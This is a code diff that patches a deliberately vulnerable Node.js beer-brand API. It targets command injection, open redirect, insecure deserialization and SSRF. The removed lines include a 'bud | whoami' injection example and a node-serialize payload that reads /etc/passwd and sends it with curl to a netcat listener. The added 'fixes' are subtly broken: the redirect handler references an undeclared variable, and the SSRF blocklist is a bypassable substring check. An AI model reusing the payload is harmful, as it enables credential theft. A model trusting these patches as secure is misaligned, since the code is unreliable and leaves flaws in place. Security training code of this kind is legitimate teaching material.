@@ -1,99 +1,113 @@
-'user strcit';
+'use strict';
 
-module.exports = (app,db) => {
+const { execFile } = require('child_process');
+const axios = require('axios');
+const { URL } = require('url');
 
-    //Get System/ warehouse information
+module.exports = (app, db) => {
+
     /**
-     * GET /v1/status/{brand}
-     * @summary Check if brand website is available through curl (RCE - Remote Code Execution)
-     * @description command execution - brand="bud | whoami"
-     * @tags system
-     * @param {string} brand.path.required - the beer brand you want to test
+     * =========================
+     * FIXED: RCE (Command Injection)
+     * =========================
+     * ❌ كان بيستخدم execSync مع user input
+     * ✅ استخدمنا execFile + whitelist
      */
-    app.get('/v1/status/:brand', (req,res) =>{
-        var execSync = require('child_process').execSync;
+    app.get('/v1/status/:brand', (req, res) => {
 
-        try{
-            const test = execSync("curl https://letmegooglethat.com/?q="+ req.params.brand)
-            res.send(test)
+        // ✅ whitelist للبراندات المسموح بيها فقط
+        const allowedBrands = ['bud', 'corona', 'heineken'];
+
+        const brand = req.params.brand;
+
+        if (!allowedBrands.includes(brand)) {
+            return res.status(400).json({ error: "Invalid brand" });
         }
-        catch (e){
-            console.log(e)
-        }
-        
+
+        // ✅ execFile يمنع command injection
+        execFile(
+            'curl',
+            [`https://letmegooglethat.com/?q=${brand}`],
+            { timeout: 3000 },
+            (err, stdout) => {
+                if (err) {
+                    return res.status(500).json({ error: "Execution failed" });
+                }
+                res.type('text/plain').send(stdout);
+            }
+        );
     });
-        //redirect user to brand
+
     /**
-     * GET /v1/redirect/
-     * @summary Redirect the user the beer brand website (Insecure redirect)
-     * @Author 
-     * @tags system
-     * @param {string} url.query.required - the beer brand you want to redirect to
+     * =========================
+     * FIXED: Open Redirect
+     * =========================
      */
-     app.get('/v1/redirect/', (req,res) =>{
-    var url = req.query.url
-    console.log(url)
-    if(url){
-        res.redirect(url);
-    } else{
-        next()
+    app.get('/v1/redirect/', (req, res) => {
+
+       // FIX: allowlist redirect domains
+    const allowedDomains = ['example.com'];
+
+    try {
+    const parsed = new URL(url);
+    if (!allowedDomains.includes(parsed.hostname)) {
+     return res.status(403).send("Forbidden redirect");
     }
-        
+    res.redirect(url);
+}   catch {
+    res.status(400).send("Invalid URL");
+}
+
+       
     });
-    //initialize list of beers
+
     /**
-     * POST /v1/init/
-     * @summary Initalize beers from object (Insecure Object Deserialization)
-     * @description 
-            {"rce":"_$$ND_FUNC$$_function ()
-            {require('child_process').exec(
-            '/bin/sh -c \"cat /etc/passwd | tr \'\n\' \' \' | curl -d @- localhost:4444\"',
-            function(error, stdout, stderr)
-            {console.log(stdout) }
-            );} () "}
-
-
-            netcat -l 4444
-     * @Author Insecure Object Deserialization
-     * @tags system
-     * @param {object} request.body.required - the beer brand you want to test
+     * =========================
+     * FIXED: Insecure Object Deserialization
+     * =========================
+     * ❌ node-serialize يؤدي إلى RCE
+     * ✅ استخدام JSON.parse فقط
      */
-     app.post('/v1/init', (req,res) =>{
-        var serialize = require('node-serialize');
-        const body = req.body.object;
-        var deser = serialize.unserialize(body)
-        console.log(deser)
-        
-    });
-    //perform a test on an endpoint
-    /**
-     * GET /v1/test/
-     * @summary Perform a get request on another url in the system (SSRF - Server Side Request Forgery)
-     * @tags system
-     * @param {string} url.query.required - the beer brand you want to redirect to
-     */
-     app.get('/v1/test/', (req,res) =>{
-         var requests = require('axios')
-        var url = req.query.url
-        console.log(url)
-        if(url){
+    app.post('/v1/init', (req, res) => {
 
-            requests.get(url)
-            .then(Ares => {
-                //console.log(Ares);
-                res.json({response:Ares.status});
-                console.log(`statusCode: ${Ares.status}`);
-            })
-            .catch(error => {
-                console.error(error);
-                res.json({response:error});
+        try {
+            // ✅ parse JSON safely
+            const data = JSON.parse(req.body.object);
 
-            });
-        } else{
-            res.json({error:"No url provided"});
+            if (typeof data !== 'object') {
+                return res.status(400).json({ error: "Invalid data" });
+            }
 
+            console.log("Safe data:", data);
+            res.json({ status: "Initialized safely" });
+
+        } catch (e) {
+            res.status(400).json({ error: "Invalid JSON" });
         }
-        console.log(res)
-            return
-        });
+    });
+
+    /**
+     * =========================
+     * FIXED: SSRF
+     * =========================
+     */
+    app.get('/v1/test/', async (req, res) => {
+
+        try {
+            const target = new URL(req.query.url);
+
+            // ✅ منع internal IPs
+            const blockedHosts = ['localhost', '127.0.0.1', '169.254'];
+
+            if (blockedHosts.some(h => target.hostname.includes(h))) {
+                return res.status(403).json({ error: "SSRF blocked" });
+            }
+
+            const response = await axios.get(target.href, { timeout: 3000 });
+            res.json({ status: response.status });
+
+        } catch (e) {
+            res.status(400).json({ error: "Invalid URL" });
+        }
+    });
 };
